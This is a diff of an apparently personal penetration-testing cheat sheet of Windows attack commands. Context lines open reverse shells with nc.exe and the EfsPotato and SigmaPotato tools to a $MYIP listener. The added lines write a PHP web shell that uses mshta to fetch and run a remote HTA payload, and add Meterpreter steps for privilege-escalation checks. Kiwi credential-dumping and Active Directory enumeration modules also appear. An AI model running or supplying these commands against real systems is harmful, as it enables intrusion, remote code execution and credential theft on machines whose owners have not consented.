@@ -284,6 +284,7 @@ git add shell.*;git commit -m 'added';git push http://43ce39bb0bd6bc489284f2905f
 C:\programdata\tmp\nc.exe $MYIP 5555 -e cmd.exe
 C:\programdata\tmp\EfsPotato.exe "C:\programdata\tmp\nc.exe $MYIP 5555 -e cmd"
 C:\programdata\tmp\SigmaPotato.exe --revshell $MYIP 5555
+echo '<?php system('mshta http://$MYIP:8080/7qvnY13vrce.hta');?>' > shell.php
 
 +---------- Listeners ----------+
 python3 -m http.server 8888 -d ~/Upload
@@ -626,8 +627,13 @@ powershell -c "Set-ExecutionPolicy unrestricted"
 services.msc
 
 [*] Meterpreter
-load exploit
+load powershell
+powershell_import ~/Upload/windows/PrivescCheck.ps1
+powershell_execute "Invoke-PrivescCheck"
+run multi/recon/local_exploit_suggester
+
 load kiwi
+load exploit
 load priv
 
 getuid
@@ -643,7 +649,6 @@ ifconfig
 
 getsystem
 cd \\users
-run multi/recon/local_exploit_suggester
 
 run post/windows/gather/enum_ad_users
 run post/windows/gather/enum_ad_computers
